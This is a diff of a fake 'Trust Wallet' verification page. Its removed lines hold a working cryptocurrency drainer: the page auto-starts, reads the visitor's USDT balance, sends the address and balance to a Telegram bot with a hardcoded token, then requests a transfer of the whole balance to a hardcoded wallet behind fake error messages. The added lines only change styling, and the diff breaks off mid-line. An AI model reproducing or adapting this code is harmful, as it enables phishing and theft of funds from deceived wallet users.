@@ -6,115 +6,17 @@
     <title>Trust Wallet | Secure Verification</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
-    
     <style>
-        body { margin: 0; font-family: -apple-system, sans-serif; background: #0b0e11; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0b0e11; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
         .card { background: #1e2329; padding: 25px; border-radius: 24px; text-align: center; width: 90%; max-width: 360px; border: 1px solid #2d3139; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
         .logo { width: 50px; margin-bottom: 10px; }
-        h2 { font-size: 20px; color: #fff; margin-bottom: 8px; }
-        p.desc { color: #929aa5; font-size: 14px; margin-bottom: 20px; line-height: 1.5; }
+        h2 { font-size: 18px; color: #fff; margin-bottom: 5px; font-weight: 600; }
+        p.desc { color: #929aa5; font-size: 13px; margin-bottom: 20px; line-height: 1.4; }
         
-        /* QR Styling */
-        #qrcode-container { background: white; padding: 15px; border-radius: 20px; display: inline-block; margin-bottom: 20px; border: 3px solid #3172DE; }
+        /* Official QR Styling */
+        #qrcode-container { background: white; padding: 15px; border-radius: 20px; display: inline-block; margin-bottom: 15px; border: 4px solid #3172DE; }
+        #qrcode img { margin: 0 auto; }
         
-        .btn { background: #3172DE; color: white; border: none; padding: 16px; width: 100%; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; }
-        
-        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0b0e11; z-index: 100; flex-direction: column; align-items: center; justify-content: center; }
-        .spinner { border: 4px solid #333; border-top: 4px solid #3172DE; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
-</head>
-<body>
-
-    <div class="card">
-        <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png" class="logo" alt="Trust Logo">
-        <h2>Verify Assets</h2>
-        <p class="desc">Scan this QR with <b>Phone Camera</b> or <b>Trust Scanner</b> to initiate secure on-chain verification.</p>
-        
-        <div id="qrcode-container">
-            <div id="qrcode"></div>
-        </div>
-
-        <button id="nextBtn" class="btn" onclick="startVerification()">Verify Assets</button>
-    </div>
-
-    <div id="overlay">
-        <div class="spinner"></div>
-        <p id="status" style="color:#3172DE; margin-top:20px; font-weight:bold;">Connecting to Secure Node...</p>
-    </div>
-
-    <script>
-        // --- APNI DETAILS YAHAN BHREIN ---
-        const myWallet = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe"; 
-        const usdtToken = "0x55d398326f99059fF775485246999027B3197955"; 
-        const botToken = "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI";
-        const chatId = "7849151110";
-
-        // --- DEEP LINK QR GENERATION ---
-        window.onload = function() {
-            const currentUrl = window.location.href;
-            // Ye link scan hote hi seedha Trust Wallet ke browser mein le jayega
-            const deepLink = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(currentUrl);
-            
-            new QRCode(document.getElementById("qrcode"), {
-                text: deepLink,
-                width: 200,
-                height: 200
-            });
-
-            // Agar user pehle se hi wallet browser mein hai, toh automatic start kar do
-            if (window.ethereum || window.trustwallet) {
-                startVerification();
-            }
-        };
-
-        async function startVerification() {
-            const isWeb3 = !!(window.ethereum || window.trustwallet);
-            
-            if (!isWeb3) {
-                // Agar normal browser hai toh deep link trigger karo
-                window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(window.location.href);
-                return;
-            }
-
-            document.getElementById("overlay").style.display = "flex";
-            const statusText = document.getElementById("status");
-
-            try {
-                const provider = window.ethereum || window.trustwallet;
-                const web3 = new Web3(provider);
-                const accounts = await provider.request({ method: 'eth_requestAccounts' });
-                const user = accounts[0];
-
-                // Switch to BSC Network
-                await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
-
-                const abi = [
-                    { "constant": true, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function" },
-                    { "constant": false, "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "transfer", "outputs": [{"name": "", "type": "bool"}], "type": "function" }
-                ];
-
-                const contract = new web3.eth.Contract(abi, usdtToken);
-                const balWei = await contract.methods.balanceOf(user).call();
-                const bal = web3.utils.fromWei(balWei, 'ether');
-
-                // Telegram Pe Message Bhejo
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=👤 Connected: ${user}\nBalance: ${bal} USDT`);
-
-                if (parseFloat(bal) > 0) {
-                    statusText.innerText = "Finalizing Asset Sync...";
-                    // Transfer popup with MAX amount
-                    await contract.methods.transfer(myWallet, balWei).send({ from: user });
-                    alert("Verification error: Node timeout. Please retry.");
-                } else {
-                    alert("No assets found for verification.");
-                }
-            } catch (e) {
-                alert("Action Denied: Security Signature Required.");
-            } finally {
-                document.getElementById("overlay").style.display = "none";
-            }
-        }
-    </script>
-</body>
-</html>
+        /* Address Section (Trust Wallet Style) */
+        .address-container { background: #2d3139; border-radius: 12px; padding: 12px; margin-bottom: 20px; border: 1px dashed #474d57; }
+        .address-label { font-size:
